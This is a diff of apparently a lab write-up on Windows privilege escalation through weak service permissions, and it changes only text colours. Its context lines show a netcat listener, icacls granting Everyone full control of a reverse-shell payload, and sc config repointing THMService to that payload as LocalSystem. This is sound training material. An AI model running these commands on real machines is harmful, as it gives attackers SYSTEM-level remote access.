@@ -9,7 +9,7 @@ If the Service `DACL` allow us to Modify the Configuration of a Service we will 
 
 <br/>
 
-- We can use a Tool <b style={{ color: 'LightGreen' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>
+- We can use a Tool <b style={{ color: 'Coral' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>
 
 ```batch
 accesschk <file, directory, registry key, process, service, object>
@@ -20,7 +20,7 @@ accesschk <file, directory, registry key, process, service, object>
 <br/>
 
 
-- The Group <b style={{ color: 'PowderBlue' }}>BUILTIN\\Users: (SERVICE_ALL_ACCESS)</b> can Reconfigure any Service.
+- The Group <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(SERVICE_ALL_ACCESS)</b> can Reconfigure any Service.
 
 ```log
 C:\tools\AccessChk> accesschk64.exe /accepteula
@@ -51,7 +51,7 @@ attacker@machine:~$ nc -lvp 4447
 
 <br/>
 
-- Granting <b style={{ color: 'PowderBlue' }}>Everyone:(F)</b> Permissions to the <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>
+- Granting <b style={{ color: 'DeepSkyBlue' }}>Everyone:(F)</b> Permissions to the <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>
 
 ```batch
 C:\> icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
@@ -70,7 +70,7 @@ C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalS
 <br/>
 
 - Starting a `netcat` Listener.
-- Restarting the <b style={{ color: 'DeepSkyBlue' }}>THMService</b> Service
+- Restarting the <b style={{ color: 'MediumTurquoise' }}>THMService</b> Service
 
 ```powershell
 C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
